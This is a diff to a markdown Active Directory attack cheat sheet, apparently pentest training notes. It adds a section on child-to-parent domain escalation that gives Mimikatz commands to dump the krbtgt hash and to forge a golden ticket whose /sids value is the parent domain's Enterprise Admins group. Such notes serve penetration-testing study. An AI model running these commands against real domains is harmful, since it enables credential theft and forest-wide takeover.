@@ -22,6 +22,7 @@
   * [Across Trust](#privilege-escalation-across-trust)
   * [Privilege Escalation - Child to Parent](#privilege-escalation-child-to-parent)
   * [Child to Parent - Trust Tickets](#privilege-escaltion-using-trust-tickets)
+  * [Child to Parent - Krbtgt Hash](#privilege-escalation-using-krbtgt-hash)
 * [Kerberos](#kerberos)
   * [Introduction](#introduction)
   * [Kerberos Delegation](#kerberos-delegation)
@@ -762,6 +763,17 @@ C:\AD\Tools\Rubeus.exe asktgs /service:http/<parent_domain_controller.domain> /d
 | /ldap | Retrieve PAC information from the current DC |
 | /user | user to impersonate |
 | /nowrap | no newlines in the output |
+
+### Privilege Escalation using Krbtgt Hash
+Once again we will exploit sIDHistory
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<current_domain> /sid:<sid_of_domain> /sids:<sid_of_enterprise_admins_group_in_parent_domain> /krbtgt:<krbtgt_hash> /ptt" "exit"
+```
+
+In the above command, the mimikatz option "/sids" is forcefully setting the sIDHistory for the enterprise admin group for a domain that is the Forest Enterprise Admin Group
 
 <div style="page-break-after: always;"></div>
 
